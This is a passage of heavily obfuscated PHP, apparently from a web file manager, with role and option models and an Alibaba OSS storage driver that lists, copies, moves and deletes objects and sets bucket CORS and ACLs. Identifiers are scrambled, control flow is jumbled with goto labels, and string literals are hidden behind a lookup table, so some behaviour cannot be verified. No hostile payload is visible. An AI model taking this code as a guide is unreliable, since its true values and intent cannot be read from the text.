(!isset($b‘†’òÛ›[$D¸°Šä¦·ª[203]]) && isset($b‘†’òÛ›[$D¸°Šä¦·ª[221]])) { $b‘†’òÛ›[$D¸°Šä¦·ª[203]] = $b‘†’òÛ›[$D¸°Šä¦·ª[221]]; } } catch (OSS\Core\OssException $bãÇ¤ß´’) { $b‘†’òÛ› = !1; } if (!$b‘†’òÛ›) { } return $b‘†’òÛ›; } protected function _isFolder($dµ‘À’Ã») { goto bÔÍÊ¡¢¥ã; CÄˆ´Û•éÚ: $BÍÕ¡ÏœÂ¨ = $this->client->getBucket($this->bucket, $dµ‘À’Ã», null, 1); if (empty($BÍÕ¡ÏœÂ¨)) { return !1; } $BÍÕ¡ÏœÂ¨ = array_values($BÍÕ¡ÏœÂ¨); goto dÜçÊ÷°¤Â; bÔÍÊ¡¢¥ã: $cêŞÖ‹ÆŒó =& $_SERVER[Ìó]; $dµ‘À’Ã» = rtrim($dµ‘À’Ã», $cêŞÖ‹ÆŒó[8]); if ($dµ‘À’Ã» == $cêŞÖ‹ÆŒó[33] || $dµ‘À’Ã» == $cêŞÖ‹ÆŒó[8]) { return !0; } goto CÄˆ´Û•éÚ; dÜçÊ÷°¤Â: if (substr($BÍÕ¡ÏœÂ¨[0][$cêŞÖ‹ÆŒó[28]], -1) == $cêŞÖ‹ÆŒó[8]) { return !0; } if (get_path_this($BÍÕ¡ÏœÂ¨[0][$cêŞÖ‹ÆŒó[28]]) == get_path_this($dµ‘À’Ã»)) { return !1; } return !0; goto A•‘°ò÷ã; A•‘°ò÷ã: } } define($_SERVER[Ìó][222], 1); goto D…È¯ç¨ Å; CŠßØ““™Š: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\155\x5f\157\x70\164\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\157\x6c\145", "\x72\x6f\154\x65\x47\162\x6f\165\x70", "\x72\145\x67\x69\163\x74", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($f˜²‰¢§ËÂ) { return "\x53\x79\163\x74\145\x6d\117\x70\164\151\157\156\137{$f˜²‰¢§ËÂ}"; } protected function optionDefault($eÑ×öËË±´ = '') { $fç¶‰•Õ„ =& $_SERVER[Ìó]; if ($eÑ×öËË±´ == $fç¶‰•Õ„[33]) { return $GLOBALS[$fç¶‰•Õ„[6]][$fç¶‰•Õ„[2441]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\162\157\x6c\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x61\x75\164\150", "\154\141\142\x65\x6c", "\x64\151\x73\x70\154\x61\x79", "\163\171\163\x74\x65\155", "\144\x65\x73\x63", "\x69\x67\x6e\157\162\x65\x45\x78\164", "\151\x67\x6e\x6f\162\x65\x46\x69\x6c\145\123\151\172\x65", "\141\x64\x6d\151\x6e\151\163\164\162\x61\164\157\x72", "\163\157\162\x74"); public function listData($CãÕŞÔƒêµ = false, $aºë¬ÃÜµ‹ = "\163\157\x72\164", $D‡İÏ¼‹—ä = false) { return parent::listData($CãÕŞÔƒêµ, $aºë¬ÃÜµ‹, $D‡İÏ¼‹—ä); } public function update($E ‹§Åö¿¥, $dƒ„ÚºÚ) { goto AÀ¦œš¬Ìñ; AÀ¦œš¬Ìñ: $fâ¤ÈíÛù =& $_SERVER[Ìó]; $aâÙÕĞêÏ = parent::listData($E ‹§Åö¿¥); $f×èÁá‡Ğ = $this->findByName($dƒ„ÚºÚ[$fâ¤ÈíÛù[28]]); goto cÁóäŞæò£; d–²£¬ÊàÁ: return parent::update($E ‹§Åö¿¥, $dƒ„ÚºÚ); goto f…£¦Û£ ; cÁóäŞæò£: if (!$aâÙÕĞêÏ || $f×èÁá‡Ğ && $f×èÁá‡Ğ[$fâ¤ÈíÛù[363]] != $aâÙÕĞêÏ[$fâ¤ÈíÛù[363]]) { return !1; } if ($f×èÁá‡Ğ[$fâ¤ÈíÛù[2442]] == 1) { $dƒ„ÚºÚ = array($fâ¤ÈíÛù[28] => $dƒ„ÚºÚ[$fâ¤ÈíÛù[28]], $fâ¤ÈíÛù[2090] => $dƒ„ÚºÚ[$fâ¤ÈíÛù[2090]]); } $this->filterAuth($dƒ„ÚºÚ[$fâ¤ÈíÛù[372]]); goto d–²£¬ÊàÁ; f…£¦Û£ : } public function remove($F˜…–í¯ß¦) { $Eä‹†Ç­½½ = parent::listData($F˜…–í¯ß¦); if (!$Eä‹†Ç­½½ || $Eä‹†Ç­½½[$_SERVER[Ìó][1076]]) { return !1; } return parent::remove($F˜…–í¯ß¦); } public function add($f®…ã–ø®) { goto a¤Î®×ÙÜ†; a¤Î®×ÙÜ†: $A‡¼Åèˆ×Ç =& $_SERVER[Ìó]; $fÌ·Û…±Á = $f®…ã–ø®[$A‡¼Åèˆ×Ç[28]]; if ($this->findByName($fÌ·Û…±Á)) { return !1; } goto Cõ«îÀ‡¦ä; a¼—ì„†µ: return parent::insert($f®…ã–ø®); goto a»¯‘ĞŒÑ; Cõ«îÀ‡¦ä: $f¤ÜÁµ‡Áì = array($A‡¼Åèˆ×Ç[382] => $fÌ·Û…±Á, $A‡¼Åèˆ×Ç[2078] => $A‡¼Åèˆ×Ç[33], $A‡¼Åèˆ×Ç[2074] => $A‡¼Åèˆ×Ç[2091], $A‡¼Åèˆ×Ç[2443] => 1, $A‡¼Åèˆ×Ç[2077] => 0, $A‡¼Åèˆ×Ç[2444] => 0, $A‡¼Åèˆ×Ç[2076] => $this->getSort()); $f®…ã–ø® = array_merge($f¤ÜÁµ‡Áì, $f®…ã–ø®); $this->filterAuth($f®…ã–ø®[$A‡¼Åèˆ×Ç[372]]); goto a¼—ì„†µ; a»¯‘ĞŒÑ: } private function getSort() { $F×ç¼÷Æ½² =& $_SERVER[Ìó]; $bçñìƒŞ” = parent::listData(); $Eõ†Ì½»ì = array_to_keyvalue($bçñìƒŞ”, $F×ç¼÷Æ½²[33], $F×ç¼÷Æ½²[2093]); return empty($Eõ†Ì½»ì) ? 0 : max($Eõ†Ì½»ì) + 1; } private function filterAuth(&$eÔ×ÚÀñ†Â) { $d„ÃõØ¤£ =& $_SERVER[Ìó]; $BØÌøŒÏèî = array(); $A¨º›ÑÂŒ = array_filter(explode($d„ÃõØ¤£[47], $eÔ×ÚÀñ†Â)); foreach ($A¨º›ÑÂŒ as $eÔ×ÚÀñ†Â) { $fÄÀõÊ¸Ó = explode($d„ÃõØ¤£[91], $eÔ×ÚÀñ†Â); if ($fÄÀõÊ¸Ó[0] == $d„ÃõØ¤£[1752] && $fÄÀõÊ¸Ó[1] != $d„ÃõØ¤£[1032]) { $cŒğñ†«š³ = $fÄÀõÊ¸Ó[0] . $d„ÃõØ¤£[91] . $fÄÀõÊ¸Ó[1] . $d„ÃõØ¤£[2445]; if (!in_array($cŒğñ†«š³, $A¨º›ÑÂŒ)) { $BØÌøŒÏèî[] = $cŒğñ†«š³; } } $BØÌøŒÏèî[] = $eÔ×ÚÀñ†Â; } $eÔ×ÚÀñ†Â = implode($d„ÃõØ¤£[47], $BØÌøŒÏèî); } public function sort($a°»Íù¬˜Ş, $DôçìÒÀ¯×) { return parent::update($a°»Íù¬˜Ş, $DôçìÒÀ¯×); } } goto eÑ…ˆ‰¢Ï¶; E…à–ˆ¼¼: register_shutdown_function($_SERVER[†˜ı][36]); set_error_handler($_SERVER[†˜ı][49], $C•›âö®·É); if (function_exists($_SERVER[†˜ı][50])) { set_exception_handler($_SERVER[†˜ı][51]); } goto Ašƒ¼…ô‰; aÈÍÂÇŒ‡¶: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($a¡©¥„…) { parent::__construct($a¡©¥„…); $this->signatureVersion($_SERVER[Ìó][196]); } public function fileOutLink($Eñ½Ì¥”‰ò) { $B·”³¼ì„ =& $_SERVER[Ìó]; if (substr($Eñ½Ì¥”‰ò, 0, 7) == $B·”³¼ì„[1104]) { $Eñ½Ì¥”‰ò = $B·”³¼ì„[1105] . substr($Eñ½Ì¥”‰ò, 7); } header($B·”³¼ì„[152] . $Eñ½Ì¥”‰ò); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($A®˜É¿õá) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ìó][1159]; $this->_init($A®˜É¿õá); } public function _init($Fæ‹çóë’¯) { foreach ($Fæ‹çóë’¯ as $b¸Ğñİ¨Õ¦ => $d×¨Ç¢¾”°) { if (isset($this->{$b¸Ğñİ¨Õ¦})) { $this->{$b¸Ğñİ¨Õ¦} = $d×¨Ç¢¾”°; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ìó][1160], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto dùµ»ì¹Ğ…; BŞ¬‚Âøƒ¨: $bˆùè“ª¾¢->addAllowedOrigin($cÑ¼å‹İ†Ï[1161]); $bˆùè“ª¾¢->addAllowedMethod($cÑ¼å‹İ†Ï[1162]); $bˆùè“ª¾¢->addAllowedMethod($cÑ¼å‹İ†Ï[1163]); goto e‚ºÜ¥¶“Ö; e‚ºÜ¥¶“Ö: $bˆùè“ª¾¢->addAllowedMethod($cÑ¼å‹İ†Ï[1164]); $bˆùè“ª¾¢->addAllowedMethod($cÑ¼å‹İ†Ï[1165]); $bˆùè“ª¾¢->addAllowedMethod($cÑ¼å‹İ†Ï[151]); goto añÚãºÀá; fÄ³†»Ò§–: $cô„é»ø¢ì->addRule($bˆùè“ª¾¢); try { $this->client->putBucketCors($this->bucket, $cô„é»ø¢ì); } catch (OSS\Core\OssException $a­æë‘ƒÙ) { return !1; } return !0; goto b»«—ŞÔ±¯; dùµ»ì¹Ğ…: $cÑ¼å‹İ†Ï =& $_SERVER[Ìó]; $cô„é»ø¢ì = new OSS\Model\CorsConfig(); $bˆùè“ª¾¢ = new OSS\Model\CorsRule(); goto BŞ¬‚Âøƒ¨; añÚãºÀá: $bˆùè“ª¾¢->setMaxAgeSeconds(600); $bˆùè“ª¾¢->addExposeHeader($cÑ¼å‹İ†Ï[1166]); $bˆùè“ª¾¢->addAllowedHeader($cÑ¼å‹İ†Ï[1161]); goto fÄ³†»Ò§–; b»«—ŞÔ±¯: } public function getBucketCors() { goto fÃ‹«£³Œù; Dø»¨óĞ…: $D«†°“ßƒ = $céÚàÅñá[0]->getMaxAgeSeconds(); $B®Â¸´òí† = $céÚàÅñá[0]->getExposeHeaders(); $aÃ¿ºŒ‡Êè = $céÚàÅñá[0]->getAllowedHeaders(); goto BŸÏì¯ƒ¼; fÃ‹«£³Œù: $f‹âÓ…ĞôÇ =& $_SERVER[Ìó]; $f¬íäÁ’‹– = null; try { $f¬íäÁ’‹– = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $aíì§À¸Õ˜) { return null; } goto aÑË˜Ûàª¢; BŸÏì¯ƒ¼: return array($f‹âÓ…ĞôÇ[171] => isset($eäŞšÓÉ–¿[0]) ? $eäŞšÓÉ–¿[0] : $f‹âÓ…ĞôÇ[33], $f‹âÓ…ĞôÇ[175] => $DÀ§õÛ×óÓ, $f‹âÓ…ĞôÇ[1167] => $D«†°“ßƒ, $f‹âÓ…ĞôÇ[1168] => isset($B®Â¸´òí†[0]) ? $B®Â¸´òí†[0] : $f‹âÓ…ĞôÇ[33], $f‹âÓ…ĞôÇ[173] => isset($aÃ¿ºŒ‡Êè[0]) ? $aÃ¿ºŒ‡Êè[0] : $f‹âÓ…ĞôÇ[33]); goto d£§¢º‹İ; aÑË˜Ûàª¢: if (!$f¬íäÁ’‹– || !($céÚàÅñá = $f¬íäÁ’‹–->getRules())) { return null; } $eäŞšÓÉ–¿ = $céÚàÅñá[0]->getAllowedOrigins(); $DÀ§õÛ×óÓ = $céÚàÅñá[0]->getAllowedMethods(); goto Dø»¨óĞ…; d£§¢º‹İ: } public function isBucketCors() { goto B¤¬îĞ¡«Ò; B¤¬îĞ¡«Ò: $c§ èĞÙÖî =& $_SERVER[Ìó]; $EÁ¨äœ¢ò§ = $this->getBucketCors(); if (!$EÁ¨äœ¢ò§ || !is_array($EÁ¨äœ¢ò§)) { return !1; } goto A’Åùõ÷³ç; A’Åùõ÷³ç: if ($EÁ¨äœ¢ò§[$c§ èĞÙÖî[171]] != $c§ èĞÙÖî[172] || $EÁ¨äœ¢ò§[$c§ èĞÙÖî[173]] != $c§ èĞÙÖî[172]) { return !1; } $bœ†×¡è– = array_map($c§ èĞÙÖî[174], $EÁ¨äœ¢ò§[$c§ èĞÙÖî[175]]); if (!is_array($bœ†×¡è–)) { $bœ†×¡è– = array(); } goto B¿’óŒ¢“‡; B¿’óŒ¢“‡: $dˆçëêô‘ = array($c§ èĞÙÖî[176], $c§ èĞÙÖî[177], $c§ èĞÙÖî[178], $c§ èĞÙÖî[179], $c§ èĞÙÖî[180]); $fÍî§«´¤ = array_diff($dˆçëêô‘, $bœ†×¡è–); return empty($fÍî§«´¤); goto AÙ†›ÀÂºÏ; AÙ†›ÀÂºÏ: } public function mkfile($Bä¶ìîòÌ¹, $EåÑÓ„êÕ = '', $cõÎ‡–ßÃ = REPEAT_RENAME) { $CÜ¾ª’ï§ = $this->setContent($Bä¶ìîòÌ¹, $EåÑÓ„êÕ); if ($CÜ¾ª’ï§ !== !1) { return $this->getPathOuter($Bä¶ìîòÌ¹); } return !1; } public function mkdir($a«á©‰íé, $a¨¢ºßìÏÇ = REPEAT_SKIP) { if ($this->_isFolder($a«á©‰íé)) { return $this->getPathOuter($a«á©‰íé); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($a«á©‰íé)); } catch (OSS\Core\OssException $bè± ®¹’›) { return !1; } return $this->getPathOuter($a«á©‰íé); } private function fileList($C½ëó„Âá, $CŸ½Šà§éØ = '', $Eê¾³Ñ’µÔ = 0) { goto fãœÏô˜òä; fãœÏô˜òä: $Dë†‹Öª…é =& $_SERVER[Ìó]; $C½ëó„Âá = trim($C½ëó„Âá, $Dë†‹Öª…é[8]); $d…à¸õÎöš = empty($C½ëó„Âá) ? $Dë†‹Öª…é[33] : $C½ëó„Âá . $Dë†‹Öª…é[8]; goto fìßèÑ¨¸Ù; fìßèÑ¨¸Ù: $f…ô®ËÕš = $Dë†‹Öª…é[33]; $Féé´ïš× = 1000; $B«°…Üë³£ = $c‰÷«Ëšİ = array(); goto EëÀì­ëõ™; EëÀì­ëõ™: while (!0) { $Få«©ç»å× = array($Dë†‹Öª…é[1169] => $CŸ½Šà§éØ, $Dë†‹Öª…é[182] => $d…à¸õÎöš, $Dë†‹Öª…é[1170] => $Féé´ïš×, $Dë†‹Öª…é[1171] => $f…ô®ËÕš); try { $b¬»»Š•¹ = $this->client->listObjects($this->bucket, $Få«©ç»å×); } catch (OSS\Core\OssException $Aà¬“áÊß¼) { break; } $f…ô®ËÕš = $b¬»»Š•¹->getNextMarker(); $cÕÈéâö = $b¬»»Š•¹->getObjectList(); $D›ôµªÕ„ = $b¬»»Š•¹->getPrefixList(); foreach ($cÕÈéâö as $E§–ÛƒâöĞ) { if ($E§–ÛƒâöĞ->getKey() == $d…à¸õÎöš) { continue; } $A£ŞÜšËª = $E§–ÛƒâöĞ->getKey(); if ($Eê¾³Ñ’µÔ) { $A£ŞÜšËª = array($Dë†‹Öª…é[28] => $A£ŞÜšËª, $Dë†‹Öª…é[77] => $E§–ÛƒâöĞ->getSize(), $Dë†‹Öª…é[186] => strtotime($E§–ÛƒâöĞ->getLastModified())); } $c‰÷«Ëšİ[] = $A£ŞÜšËª; } foreach ($D›ôµªÕ„ as $eŒÈµëô¡ó) { $B«°…Üë³£[] = $eŒÈµëô¡ó->getPrefix(); } if ($f…ô®ËÕš === $Dë†‹Öª…é[33]) { break; } } return array($Dë†‹Öª…é[74] => $B«°…Üë³£, $Dë†‹Öª…é[73] => $c‰÷«Ëšİ); goto FšÃ¡³ÀÖ‚; FšÃ¡³ÀÖ‚: } public function copyFile($bŸ ƒŸÅÅ, $e…“Şï—à) { $FŠß­Æ÷¯ = $this->size($bŸ ƒŸÅÅ); if ($FŠß­Æ÷¯ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $bŸ ƒŸÅÅ, $this->bucket, $this->pathEncode($e…“Şï—à)); } catch (OSS\Core\OssException $F­¡ƒ˜Û”) { return !1; } return !0; } return $this->multiCopyObject($bŸ ƒŸÅÅ, $e…“Şï—à, $FŠß­Æ÷¯); } private function multiCopyObject($Cµç”„ôÂù, $Cóæ¢Å¡Ğê, $D˜÷Ñ®”“) { $AŒã­Ù÷­î =& $_SERVER[Ìó]; try { goto a×àîÙ»; fÉîâÊèŠ•: $aõñÄ‘†¶‚ = 1; $DîÉÖÇ—„  = 0; $béÆº¸²Ã» = array(); goto AÙ­Îøåîˆ; AÙ­Îøåîˆ: $c¢ê‹Åƒ§£ = 1024 * 1024 * 10; $b°÷œæØ = $this->client->generateMultiuploadParts($D˜÷Ñ®”“, $c¢ê‹Åƒ§£); foreach ($b°÷œæØ as $d„÷»¯“Èœ => $CªÌùöÁ“) { $cÖõˆ¼¹Æ = $DîÉÖÇ—„  + (int) $CªÌùöÁ“[$AŒã­Ù÷­î[1173]]; $EîËğô»¤í = (int) $CªÌùöÁ“[$AŒã­Ù÷­î[321]] + $cÖõˆ¼¹Æ - 1; $B¯†«¿«½Ù = array($AŒã­Ù÷­î[1174] => $cÖõˆ¼¹Æ, $AŒã­Ù÷­î[1175] => $EîËğô»¤í); $béÆº¸²Ã»[] = $this->client->uploadPartCopy($this->bucket, $Cµç”„ôÂù, $this->bucket, $this->pathEncode($Cóæ¢Å¡Ğê), $aõñÄ‘†¶‚, $fé¶§•˜É¿, $B¯†«¿«½Ù); $aõñÄ‘†¶‚ = $aõñÄ‘†¶‚ + 1; } goto aÆğ¬ÖÕ±»; aÆğ¬ÖÕ±»: $dà“æ×Å„ = array(); foreach ($béÆº¸²Ã» as $d„÷»¯“Èœ => $c‰´‹­¢Úç) { $dà“æ×Å„[] = array($AŒã­Ù÷­î[1176] => $d„÷»¯“Èœ + 1, $AŒã­Ù÷­î[1177] => $c‰´‹­¢Úç); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Cóæ¢Å¡Ğê), $fé¶§•˜É¿, $dà“æ×Å„); goto D÷É¯ÑèËá; a×àîÙ»: $B´êŸ¦Íßó = array(); if ($d”¬œ¸œäò = $this->hashMd5($Cµç”„ôÂù)) { $B´êŸ¦Íßó = array(OSS\OssClient::OSS_HEADERS => array($AŒã­Ù÷­î[1172] => $d”¬œ¸œäò)); } $fé¶§•˜É¿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Cóæ¢Å¡Ğê), $B´êŸ¦Íßó); goto fÉîâÊèŠ•; D÷É¯ÑèËá: } catch (OSS\Core\OssException $b›ªØ—£È¾) { return !1; } return !0; } public function moveFile($E¤Îç±àÚÙ, $AŞï‡²†Ùà) { if ($this->copyFile($E¤Îç±àÚÙ, $AŞï‡²†Ùà)) { $this->remove($E¤Îç±àÚÙ); return !0; } return !1; } public function delFile($C£Ñ¢ßç”¯) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($C£Ñ¢ßç”¯)); } catch (OSS\Core\OssException $bå°ô–õ†Â) { return !1; } return !0; } public function delFolder($aì¼†ô«ËÅ) { $aºß–¥ŠâÒ =& $_SERVER[Ìó]; $EØ×Û«â¬ğ = $this->fileList($aì¼†ô«ËÅ); if (!empty($aì¼†ô«ËÅ) && !in_array(trim($aì¼†ô«ËÅ, $aºß–¥ŠâÒ[8]) . $aºß–¥ŠâÒ[8], $EØ×Û«â¬ğ[$aºß–¥ŠâÒ[73]])) { $EØ×Û«â¬ğ[$aºß–¥ŠâÒ[73]][] = trim($aì¼†ô«ËÅ, $aºß–¥ŠâÒ[8]) . $aºß–¥ŠâÒ[8]; } foreach (array_chunk($EØ×Û«â¬ğ[$aºß–¥ŠâÒ[73]], 1000) as $CÉÛªæ“”·) { try { $this->client->deleteObjects($this->bucket, $CÉÛªæ“”·); } catch (OSS\Core\OssException $c‡«À©ºÛÎ) { continue; } } return !0; } public function rename($c¬¤†µ‚È, $eïÀŸˆ¨ğ) { return $this->renameObject($c¬¤†µ‚È, $eïÀŸˆ¨ğ); } private function fileInfo($F²ÑÕŞîÃì, $Fçß·ÀÑİ = array()) { goto d§ÀŸ¤âİÊ; F“ì¥æùá¹: return $DÊå–ç…¿å; goto BÃ®ÉèÌç; d§ÀŸ¤âİÊ: $Dñ¦´£—ÈÊ =& $_SERVER[Ìó]; $DÊå–ç…¿å = array($Dñ¦´£—ÈÊ[28] => $this->pathThis($F²ÑÕŞîÃì), $Dñ¦´£—ÈÊ[75] => $this->getPathOuter($F²ÑÕŞîÃì), $Dñ¦´£—ÈÊ[29] => $Dñ¦´£—ÈÊ[163], $Dñ¦´£—ÈÊ[183] => 0, $Dñ¦´£—ÈÊ[106] => 0, $Dñ¦´£—ÈÊ[77] => 0, $Dñ¦´£—ÈÊ[156] => $this->ext($F²ÑÕŞîÃì), $Dñ¦´£—ÈÊ[184] => !0, $Dñ¦´£—ÈÊ[185] => !0); if (empty($Fçß·ÀÑİ)) { $f¾¸îÀíŞñ = $this->objectMeta($F²ÑÕŞîÃì); if (!$f¾¸îÀíŞñ) { return $DÊå–ç…¿å; } $Fçß·ÀÑİ = array($Dñ¦´£—ÈÊ[106] => strtotime($f¾¸îÀíŞñ[$Dñ¦´£—ÈÊ[1178]]), $Dñ¦´£—ÈÊ[77] => $f¾¸îÀíŞñ[$Dñ¦´£—ÈÊ[1179]] + 0); } goto Bï¡ëÆ»ô; Bï¡ëÆ»ô: if (isset($Fçß·ÀÑİ[$Dñ¦´£—ÈÊ[77]])) { $DÊå–ç…¿å[$Dñ¦´£—ÈÊ[77]] = $Fçß·ÀÑİ[$Dñ¦´£—ÈÊ[77]]; } if (isset($Fçß·ÀÑİ[$Dñ¦´£—ÈÊ[106]])) { $DÊå–ç…¿å[$Dñ¦´£—ÈÊ[106]] = $Fçß·ÀÑİ[$Dñ¦´£—ÈÊ[106]]; } if (isset($Fçß·ÀÑİ[$Dñ¦´£—ÈÊ[186]]) && !trim($DÊå–ç…¿å[$Dñ¦´£—ÈÊ[106]])) { $DÊå–ç…¿å[$Dñ¦´£—ÈÊ[106]] = $Fçß·ÀÑİ[$Dñ¦´£—ÈÊ[186]]; } goto F“ì¥æùá¹; BÃ®ÉèÌç: } private function folderInfo($Dã…Ä‚Ê§İ, $dáË·“‡‚¢ = array()) { $f„´º’°É‰ =& $_SERVER[Ìó]; $c®Ø²´¤Å— = array($f„´º’°É‰[28] => $this->pathThis($Dã…Ä‚Ê§İ), $f„´º’°É‰[75] => $this->getPathOuter($f„´º’°É‰[8] . $Dã…Ä‚Ê§İ), $f„´º’°É‰[29] => $f„´º’°É‰[76], $f„´º’°É‰[183] => 0, $f„´º’°É‰[106] => 0, $f„´º’°É‰[184] => !0, $f„´º’°É‰[185] => !0); if (empty($dáË·“‡‚¢)) { $Dã…Ä‚Ê§İ = rtrim($Dã…Ä‚Ê§İ, $f„´º’°É‰[8]) . $f„´º’°É‰[8]; $fŠíğîè = $this->objectMeta($Dã…Ä‚Ê§İ); if (!$fŠíğîè) { return $c®Ø²´¤Å—; } $dáË·“‡‚¢ = array($f„´º’°É‰[183] => $fŠíğîè[$f„´º’°É‰[1180]][$f„´º’°É‰[1181]], $f„´º’°É‰[106] => strtotime($fŠíğîè[$f„´º’°É‰[1178]])); } if (isset($dáË·“‡‚¢[$f„´º’°É‰[106]])) { $c®Ø²´¤Å—[$f„´º’°É‰[106]] = $dáË·“‡‚¢[$f„´º’°É‰[106]]; } if (isset($dáË·“‡‚¢[$f„´º’°É‰[183]])) { $c®Ø²´¤Å—[$f„´º’°É‰[183]] = $dáË·“‡‚¢[$f„´º’°É‰[183]]; } return $c®Ø²´¤Å—; } public function listPath($d‹ˆŸ·¼Ã, $A½Ìº·³• = false) { $bì—™È­ğÃ =& $_SERVER[Ìó]; $bÑ´“¢çÉ§ = $this->fileList($d‹ˆŸ·¼Ã, $bì—™È­ğÃ[8], !0); foreach ($bÑ´“¢çÉ§[$bì—™È­ğÃ[74]] as $b™œÏåù“† => $Dğ»î’”Š) { $bÑ´“¢çÉ§[$bì—™È­ğÃ[74]][$b™œÏåù“†] = $this->folderInfo($Dğ»î’”Š, $Dğ»î’”Š); } foreach ($bÑ´“¢çÉ§[$bì—™È­ğÃ[73]] as $b™œÏåù“† => $Dğ»î’”Š) { $bÑ´“¢çÉ§[$bì—™È­ğÃ[73]][$b™œÏåù“†] = $this->fileInfo($Dğ»î’”Š[$bì—™È­ğÃ[28]], $Dğ»î’”Š); } return $bÑ´“¢çÉ§; } public function has($e²±ºä…²ê, $cç±îãí†Ğ = false, $A­”­ÎÏì = true) { goto D´‡Œ£™¿; f“©Œ¯ñŸ: $a‹±®²¤§ = 0; while (!0) { $AÅ§„…ãÆ‚ = array($Eë›·İÍ¦[1169] => $Eë›·İÍ¦[8], $Eë›·İÍ¦[182] => $F”è ½Ù§, $Eë›·İÍ¦[1170] => $d÷ÑÚˆ‡Ë, $Eë›·İÍ¦[1171] => $Bº”ÕÂÈª); try { $dÕ¦Á¶Ø²ê = $this->client->listObjects($this->bucket, $AÅ§„…ãÆ‚); } catch (OSS\Core\OssException $F‹¿Ïâ¯øÓ) { break; } $Bº”ÕÂÈª = $dÕ¦Á¶Ø²ê->getNextMarker(); $bš½×ô†Ş× = $dÕ¦Á¶Ø²ê->getObjectList(); $EŠ¤Öª”« = $dÕ¦Á¶Ø²ê->getPrefixList(); if ($cç±îãí†Ğ) { if (count($bš½×ô†Ş×) > 1 || count($bš½×ô†Ş×) == 1 && $bš½×ô†Ş×[0]->getKey() != $F”è ½Ù§) { $F–ñ¥•„»á += count($bš½×ô†Ş×) - 1; } if (!empty($EŠ¤Öª”«)) { $a‹±®²¤§ += count($EŠ¤Öª”«); } if ($Bº”ÕÂÈª === $Eë›·İÍ¦[33]) { break; } continue; } if ($A­”­ÎÏì) { if (!empty($bš½×ô†Ş×)) { if (count($bš½×ô†Ş×) > 1 || $bš½×ô†Ş×[0]->getKey() != $F”è ½Ù§) { return !0; } } } else { if (!empty($EŠ¤Öª”«)) { return !0; } } if ($Bº”ÕÂÈª === $Eë›·İÍ¦[33]) { break; } } if ($cç±îãí†Ğ) { return array($Eë›·İÍ¦[187] => $F–ñ¥•„»á, $Eë›·İÍ¦[188] => $a‹±®²¤§); } goto Dæ”Ç¿Ú‹ä; Dæ”Ç¿Ú‹ä: return !1; goto b•ªáÇãôÕ; C—Ğ¯â: $Bº”ÕÂÈª = $Eë›·İÍ¦[33]; $d÷ÑÚˆ‡Ë = 500; $F–ñ¥•„»á = 0; goto f“©Œ¯ñŸ; D´‡Œ£™¿: $Eë›·İÍ¦ =& $_SERVER[Ìó]; $e²±ºä…²ê = trim($e²±ºä…²ê, $Eë›·İÍ¦[8]); $F”è ½Ù§ = empty($e²±ºä…²ê) ? $Eë›·İÍ¦[33] : $e²±ºä…²ê . $Eë›·İÍ¦[8]; goto C—Ğ¯â; b•ªáÇãôÕ: } public function listAll($dçÛÀ»ÕÇ) { $CÑƒºÂĞÍÌ =& $_SERVER[Ìó]; $fåœ²Éòì = $this->fileList($dçÛÀ»ÕÇ, $CÑƒºÂĞÍÌ[33], !0); $BöÇø”Ú = array(); foreach ($fåœ²Éòì[$CÑƒºÂĞÍÌ[73]] as $DËÎƒ¤±œ‹) { $BöÇø”Ú[$DËÎƒ¤±œ‹[$CÑƒºÂĞÍÌ[28]]] = $DËÎƒ¤±œ‹[$CÑƒºÂĞÍÌ[77]]; } return $this->listAllFiles($dçÛÀ»ÕÇ, array_keys($BöÇø”Ú), $BöÇø”Ú); } public function canRead($e´á±Â“Ó‹) { $A„‚ÉŸºÚš =& $_SERVER[Ìó]; $e·ŒÛë³ = $this->pathAcl($e´á±Â“Ó‹); return $e·ŒÛë³ == $A„‚ÉŸºÚš[1182] || $e·ŒÛë³ == $A„‚ÉŸºÚš[486] ? !0 : !1; } public function canWrite($cêÒÊ­ÆÃ¹) { $FÖ×šËšöè = $this->pathAcl($cêÒÊ­ÆÃ¹); return $FÖ×šËšöè == $_SERVER[Ìó][486] ? !0 : !1; } public function pathAcl($DåÑ‡§ÁÉ) { goto bª¡ˆÖ‰Áô; D„ï¶É£‘£: $eÈíòÎ‰¯ï = $C’±ª›ÈŞĞ == $dÍàË¿ĞŒ[34] ? $this->bucketAcl : $C’±ª›ÈŞĞ; if ($eÈíòÎ‰¯ï == $dÍàË¿ĞŒ[1183]) { return $dÍàË¿ĞŒ[1182]; } if ($eÈíòÎ‰¯ï == $dÍàË¿ĞŒ[1184]) { return $dÍàË¿ĞŒ[486]; } goto Eí¿Ÿ¢ƒˆ; Eí¿Ÿ¢ƒˆ: return $eÈíòÎ‰¯ï; goto fö•¶ˆÎ»; bª¡ˆÖ‰Áô: $dÍàË¿ĞŒ =& $_SERVER[Ìó]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $C’±ª›ÈŞĞ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($DåÑ‡§ÁÉ)); } catch (OSS\Core\OssException $CòßÈÚœŸÚ) { return !1; } goto D„ï¶É£‘£; fö•¶ˆÎ»: } private function chmodPath($B”Ö”°öˆÔ, $C ¬ëˆøò† = '') { $D¤³İ•…Ô =& $_SERVER[Ìó]; 